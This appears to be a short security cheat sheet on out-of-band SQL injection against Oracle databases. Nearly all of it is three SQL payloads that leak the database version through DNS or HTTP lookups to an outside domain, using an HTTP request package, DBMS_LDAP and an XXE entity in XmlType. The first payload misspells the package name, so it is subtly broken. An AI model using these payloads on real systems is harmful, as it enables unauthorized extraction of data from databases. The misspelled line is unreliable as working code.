---
title: "Oracle database"
description: "Tips to exfiltrate information from a Oracle database."
date: 25/12/2020
categories:
 - SQL
tags:
 - sql
 - SQL injection
 - oob
 - DNS
 - oracle
---


## Make DNS queries

```sql
SELECT url_http.request((SELECT version FROM v$instance) || 'oob.vincd.com') FROM dual;
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance) || 'oob.vincd.com', 80) FROM dual;
SELECT Extractvalue(XmlType('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://xxx.oob.vincd.com"> %remote; %param1;]>'), '/L') from dual;
```
